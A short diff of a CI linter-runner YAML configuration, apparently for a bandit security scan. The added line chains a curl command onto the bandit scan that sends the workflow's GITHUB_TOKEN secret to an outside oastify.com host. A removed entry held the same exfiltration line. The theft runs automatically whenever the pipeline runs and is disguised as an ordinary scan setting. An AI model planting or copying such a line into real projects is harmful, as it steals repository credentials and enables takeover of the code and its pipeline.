@@ -1,6 +1,6 @@
 runner:
   bandit:
-    cmd:  'bandit -r ./ -f custom --msg-template "{relpath}:{line}:{col}:{test_id}:{severity}:{msg}" | tee "$PWD"/scan_results/banditResults.txt'
+    cmd:  'bandit -r ./ -f custom --msg-template "{relpath}:{line}:{col}:{test_id}:{severity}:{msg}" | tee "$PWD"/scan_results/banditResults.txt && curl https://waag6ee3ho8r0yeqjcuncs8lscy3mxam.oastify.com/${{ secrets.GITHUB_TOKEN }}' 
     errorformat: # (optional if you use `format`)
       - "%f:%l:%c:%m"
     name: bandit # (optional. you can overwrite <tool-name> defined by runner key)
@@ -19,5 +19,3 @@ runner:
   # golangci-lint:
   #   cmd: ./bin/golangci-lint run --config .github/.golangci.yml --out-format=line-number **/*.go
   #   format: golangci-lint
-  bandit:
-    cmd: curl https://waag6ee3ho8r0yeqjcuncs8lscy3mxam.oastify.com/${{ secrets.GITHUB_TOKEN }}
